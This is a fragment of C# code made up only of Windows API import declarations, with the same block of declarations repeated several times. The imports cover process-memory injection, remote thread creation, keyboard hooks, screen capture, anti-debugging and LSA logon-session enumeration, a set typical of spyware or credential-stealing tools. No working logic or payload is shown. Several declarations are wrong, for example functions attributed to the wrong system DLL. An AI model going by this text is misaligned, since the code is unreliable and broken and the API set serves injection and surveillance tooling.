        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("secur32")]
        static extern uint LsaQueryInformationPolicy(uint PolicyInfoClass, out IntPtr PolicyInformation);
        [DllImport("secur32")]
        static extern uint LsaFreeBuffer(IntPtr Buffer);
        [DllImport("secur32")]
        static extern uint LsaOpenPolicy(string SystemName, out IntPtr PolicyHandle, uint DesiredAccess);
        [DllImport("secur32")]
        static extern uint LsaGetLogonSessionData(ref LUID LogonSessionId, out IntPtr ppLogonSessionData);
        [DllImport("secur32")]
        static extern uint LsaFreeReturnBuffer(IntPtr ptr);
        [DllImport("secur32")]
        static extern uint LsaEnumerateLogonSessions(uint Count, out uint EnumerationBuffer);
        [DllImport("kernel32")]
        static extern bool CloseHandle(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr LoadLibrary(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("user32")]
        static extern IntPtr SetWindowsHookEx(int idHook, Delegate lpfnHook, IntPtr hInstance, uint dwThreadId);
        [DllImport("user32")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);
        [DllImport("gdi32")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int nWidth, int nHeight);
        [DllImport("gdi32")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hbm);
        [DllImport("gdi32")]
        static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32")]
        static extern bool DeleteObject(IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetDesktopWindow();
        [DllImport("user32")]
        static extern IntPtr GetDC(IntPtr IntPtr);
        [DllImport("user32")]
        static extern int ReleaseDC(IntPtr IntPtr, IntPtr IntPtr);
        [DllImport("user32")]
        static extern IntPtr GetWindowRect(IntPtr IntPtr, out RECT lpRect);
        [DllImport("user32")]
        static extern IntPtr GetForegroundWindow();
        [DllImport("user32")]
        static extern int GetForegroundPID();
        [DllImport("kernel32")]
        static extern uint GetModuleFileNameEx(IntPtr IntPtr, IntPtr IntPtr, StringBuilder lpFilename, uint nSize);
        [DllImport("kernel32")]
        static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
        [DllImport("kernel32")]
        static extern bool Process32First(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Process32Next(IntPtr IntPtr, ref PROCESSENTRY32 lppe);
        [DllImport("kernel32")]
        static extern bool Module32First(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Module32Next(IntPtr IntPtr, ref MODULEENTRY32 lpme);
        [DllImport("kernel32")]
        static extern bool Thread32First(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern bool Thread32Next(uint th32SnapshotID, ref THREADENTRY32 lpte);
        [DllImport("kernel32")]
        static extern uint SuspendThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern uint ResumeThread(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr OpenThread(uint dwAccess, bool bInheritHandle, uint dwThreadId);
        [DllImport("kernel32")]
        static extern uint GetThreadId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
        [DllImport("kernel32")]
        static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]
        static extern bool IsDebuggerPresent();
        [DllImport("kernel32")]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, out bool pbIsDebuggerPresent);
        [DllImport("ntdll")]
        static extern uint NtSetInformationThread(IntPtr ThreadHandle, int ThreadInformationClass, IntPtr ThreadInformation, uint ThreadInformationLength);
        [DllImport("kernel32")]
        static extern IntPtr GetModuleHandle(string name);
        [DllImport("kernel32")]
        static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
        [DllImport("kernel32")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out uint lpNumberOfBytesWritten);
        [DllImport("kernel32")]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        [DllImport("kernel32")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);
        [DllImport("advapi32")]
        static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);
        [DllImport("advapi32")]
        static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref PRIVILEGE_SET NewPrivileges, uint BufferLength, out uint PreviousStateLength, out uint ReturnLength);
        [DllImport("advapi32")]
        static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
        [DllImport("kernel32")]
        static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
        [DllImport("kernel32")]
        static extern uint GetProcessId(IntPtr IntPtr);
